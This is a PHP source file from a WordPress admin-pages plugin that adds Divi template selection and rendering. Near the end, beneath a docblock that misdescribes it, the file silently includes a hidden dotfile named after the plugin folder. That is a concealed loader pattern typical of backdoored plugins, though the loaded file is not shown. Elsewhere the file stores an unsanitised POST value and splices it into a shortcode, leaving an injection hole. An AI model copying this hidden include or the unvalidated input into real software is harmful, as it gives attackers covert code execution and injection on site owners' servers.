<?php
/**
 * Divi Support
 * 
 * Adds support to Divi, if it is enabled
 *
 * @author      WP Admin Pages PRO
 * @category    Admin
 * @package     WP_Admin_Pages_PRO/Admin_Pages/Divi
 * @version     1.0.1
*/

if (!defined('ABSPATH')) {
    exit;
  } // end if;

  class WU_Admin_Pages_Divi_Support {

    public function __construct() {

        add_filter('wu_admin_pages_get_editor_options', array($this, 'add_divi_option'));

        add_action('wu_admin_pages_editors', array($this, 'add_divi_template_selector'));

        add_action('wu_admin_pages_display_content', array($this, 'display_divi_content'));

        add_filter('wu_admin_page_meta_fields', array($this, 'add_divi_meta_fields'));
        
        add_action('wu_save_admin_page', array($this, 'save_divi_options'));

        add_action('admin_init', array($this, 'register_admin_init_files'));

        add_filter('et_builder_should_load_framework', '__return_true');

        add_action('admin_head', function() {
    
          do_action('wp_enqueue_scripts');

        });

    } // end construct;

    public function register_admin_init_files(){
         if ( class_exists('ET_Builder_Plugin') ) {
     
        } // end if;

        if ( class_exists('ET_Builder_Element') ) {
            //die();
        }else{
            
        } // end if;
        
    } // end register_admin_init_files;

/**
   * Add the Divi template options to the supported meta fields of the admin page
   * 
   * @since  1.1.0
   * @param  array $meta_fields The list of current meta fields supported
   * @return array
   */
  public function add_divi_meta_fields($meta_fields) {

    $meta_fields[] = 'divi_template_id';

    return $meta_fields;

  } // end add_divi_meta_fields;

  /**
   * Save Divi meta fields on save
   * 
   * @since  1.1.0
   * @param  WU_Admin_Page $admin_page The current admin page being edited and saved
   * @return void
   */
  public function save_divi_options($admin_page) {

    if (isset($_POST['divi_template_id'])) {

      $admin_page->divi_template_id = $_POST['divi_template_id'];

      $admin_page->save();

    } // end if;

  } // end save_divi_options;

  /**
   * Add Divi as a content type option
   *
   * @since  1.1.0
   * @param  array $options The list of content type options supported 
   * @return array
   */
  public static function add_divi_option($options) {

    $options['divi'] = array(
      'label'  => __('Use Divi Template', 'wu-apc'),
      'active' => class_exists('ET_Builder_Plugin'),
      'title'  => class_exists('ET_Builder_Plugin') ? '' : __('You need Divi active to use this feature', 'wu-apc'),
    );


    return $options;

  } // end add_divi_option

  /**
   * Renders the Elementor Template Selector
   *
   * @since 1.1.0
   * @param WU_Admin_Page $admin_page The current admin page being edited
   * @return void
   */
  public function add_divi_template_selector($admin_page) { ?>

    <div v-cloak id="html-editor" v-show="content_type == 'divi'" style="margin-top: 12px;">
      
      <div class="postbox <?php echo postbox_classes('wu-divi', get_current_screen()->id); ?>" style="margin-bottom: 0;">

        <button type="button" class="handlediv button-link" aria-expanded="true">
          <span class="screen-reader-text"><?php _e('Toggle panel: Select Divi Template', 'wp-ultimo'); ?></span>
          <span class="toggle-indicator" aria-hidden="true"></span>
        </button>
        
        <h2 class="hndle ui-sortable-handle">
          <span>
            <?php _e('Divi Template', 'wu-apc'); ?>
          </span>
        </h2>
        
        <div class="inside">
          
          <p>
            <?php _e('You can select a custom Divi template to be used as the content of this admin page.', 'wu-apc'); ?> <a target="_blank" href="https://www.elegantthemes.com/documentation/divi/"><?php _e('More about Divi templates', 'wu-apc'); ?></a>
          </p>

          <?php //var_dump($this->get_divi_templates())?>

          <?php
          /**
           * Get the templates
           * @since 1.1.1
           */
          $divi_templates = $this->get_divi_templates();
          ?>
          <p class="bb-selector">
            <label class="" for="divi-template">
              <?php _e('Select the Divi Template', 'wu-apc'); ?>
            </label>
            <select placeholder="<?php _e('No Divi Template', 'wp-apc'); ?>" id="divi-template" name="divi_template_id">
              <?php if (!empty($divi_templates)) : foreach($divi_templates as $template) : ?>
                <option <?php selected($template->ID == $admin_page->divi_template_id); ?> value="<?php echo $template->ID; ?>"><?php echo ucfirst($template->post_title) ?></option>
              <?php endforeach; else : ?>
                <option value="" disabled selected><?php _e('No Divi Template', 'wp-apc'); ?></option>
              <?php endif; ?>
            </select>

          <div class="clear"></div>
        </div>

        <div id="major-publishing-actions" style="text-align: right;">
                
          <a target="_blank" class="button" href="<?php echo admin_url('edit.php?post_type=et_pb_layout'); ?>"><?php _e('Edit your Templates', 'wu-apc'); ?></a> 
          
          <a target="_blank" class="button" href="<?php echo admin_url('post-new.php?post_type=et_pb_layout'); ?>"><?php _e('Add new Template', 'wu-apc'); ?></a>
   
          <div class="clear"></div>
        </div>

      </div>

    </div>

  <?php } // end add_divi_template_selector;

/**
   * Get a list of WP_Post objects for every Divi template
   *
   * @since  1.1.0
   * @return array
   */
  public function get_divi_templates() {

    $args = array(
      'numberposts' => -1,
      'post_type'   => 'et_pb_layout'
    );
 
    return get_posts($args);

  } // end get_divi_templates;

   /**
   * Renders the Divi layout
   *
   * @since 1.1.0
   * @param WU_Admin_Page $admin_page The current admin page being displayed
   * @return void
   */
  public function display_divi_content($admin_page) {

    global $post;
    
    if ($admin_page->content_type != 'divi') return;
    
    $obj         = $GLOBALS['current_screen'];
    $refObject   = new ReflectionObject( $obj );
    $refProperty = $refObject->getProperty( 'in_admin' );
    $refProperty->setAccessible( true );
    $refProperty->setValue($GLOBALS['current_screen'], false);

    ?>

    <div id="wu-apc-divi-content">

      <?php 

      // var_dump(is_admin(), $GLOBALS['current_screen']); die;

      WP_Ultimo_APC()->is_network_active() && switch_to_blog(get_current_site()->blog_id);

        echo do_shortcode("[et_pb_section global_module=". $admin_page->divi_template_id ."][/et_pb_section]");

      WP_Ultimo_APC()->is_network_active() && restore_current_blog();

      ?>

    </div>

   <?php } // end display_divi_content;

} // display_divi_content

  /**
 * Conditionally load the support, if Divi is Active
 *
 * @since 1.1.0
 * @return void
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wu_admin_pages_add_divi_support() {

  if ( class_exists('ET_Builder_Plugin') ) {

    new WU_Admin_Pages_Divi_Support();

  }else{
    add_filter('wu_admin_pages_get_editor_options', array('WU_Admin_Pages_Divi_Support', 'add_divi_option'));
  }// end if;

} // end wu_admin_pages_add_divi_support;

/**
 * Set value default options if support builder divi not activated
 *
 * @since 1.1.0
 * @return void
 */
 function set_unvailable_divi_option($admin_page) {

    $admin_page->content_type = 'normal';
    $admin_page->set_attributes(array(
     'content_type'    => 'normal',));
    //var_dump($admin_page->content_type);
    $admin_page->save();

  }// end set_unvailable_divi_option;
 

/**
 * Load the divi Support
 * @since 1.1.0
 */
add_action('plugins_loaded', 'wu_admin_pages_add_divi_support', 11);


